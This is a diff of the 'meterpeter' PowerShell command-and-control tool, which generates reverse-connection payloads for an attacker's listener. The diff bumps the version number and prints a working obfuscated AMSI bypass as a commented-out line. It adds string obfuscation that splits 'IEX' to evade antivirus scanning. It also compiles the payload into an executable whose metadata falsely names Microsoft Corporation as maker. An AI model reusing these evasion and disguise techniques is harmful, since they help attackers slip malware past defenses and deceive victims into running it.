@@ -5,7 +5,7 @@
   Author: @ZHacker13 &('r00t-3xp10it')
   Required Dependencies: None
   Optional Dependencies: Python3 (windows)|Apache2 (Linux)
-  PS Script Dev Version: v2.10.6
+  PS Script Dev Version: v2.10.7
 
 .DESCRIPTION
    This PS1 starts a listener Server on a Windows|Linux attacker machine and generates oneline
@@ -39,7 +39,7 @@
 
 
 ## Meterpeter Develop version
-$dev_Version = "2.10.6";
+$dev_Version = "2.10.7";
 ## Auto-Convertion of Client.ps1 to standalone executable
 $Converter = $False
 
@@ -307,8 +307,11 @@ write-host "`n`n";
 Start-Sleep -Seconds 2;
 ## venom v1.0.16 function
 # Copy payload to apache2 to trigger attack vector.
-$Amsi_Bypass = Character_Obfuscation("(([Ref].Assembly.gettypes() | ? {`$_.Name -like `"Amsi*tils`"}).GetFields(`"NonPublic,Static`") | ? {`$_.Name -like `"amsiInit*ailed`"}).SetValue(`$null,`$true);");
-$My_Output = "$Amsi_Bypass"+"$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;
+# $Amsi_Bypass = Character_Obfuscation("(([Ref].Assembly.gettypes() | ? {`$_.Name -like `"Amsi*tils`"}).GetFields(`"NonPublic,Static`") | ? {`$_.Name -like `"amsiInit*ailed`"}).SetValue(`$null,`$true);");
+# $My_Output = "$Amsi_Bypass"+"$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;
+$My_Output = "$PowerShell_Payload" | Out-File -FilePath $IPATH$payload_name.ps1 -Force;
+((Get-Content -Path $IPATH$payload_name.ps1 -Raw) -Replace "IEX","I``E``X")|Set-Content -Path $IPATH$payload_name.ps1
+
 
 
 $PS2EXE = $env:OS
@@ -318,7 +321,7 @@ If($Converter -eq $True -and $PS2EXE -eq 'Windows_NT'){
     Write-Host "   Auto-Convertion of $payload_name.ps1 to standalone executable" -ForeGroundColor Green
     $Convertor = "$IPATH"+"PS2EXE";cd $Convertor
     Copy-Item -Path $IPATH$payload_name.ps1 -Destination $payload_name.ps1 -Force -ErrorAction SilentlyContinue;
-    .\ps2exe.ps1 -inputFile "$payload_name.ps1" -outputFile "$payload_name.exe" -iconFile 'meterpeter.ico' -title 'meterpeter binary file' -version '2.10.6' -description 'meterpeter binary file' -product 'meterpeter C2 Client' -company 'Microsoft Corporation' -copyright '©Microsoft Corporation. All Rights Reserved' -noConsole -noVisualStyles -noError
+    .\ps2exe.ps1 -inputFile "$payload_name.ps1" -outputFile "$payload_name.exe" -iconFile 'meterpeter.ico' -title 'meterpeter binary file' -version '2.10.7' -description 'meterpeter binary file' -product 'meterpeter C2 Client' -company 'Microsoft Corporation' -copyright '©Microsoft Corporation. All Rights Reserved' -noConsole -noVisualStyles -noError
     Copy-Item -Path "$payload_name.exe" -Destination $IPATH$payload_name.exe -Force -ErrorAction SilentlyContinue;
     Remove-Item -Path "$payload_name.exe" -Force -ErrorAction SilentlyContinue
     $compression = $True
@@ -2173,3 +2176,4 @@ While($Client.Connected)
   }
  }
 }
+
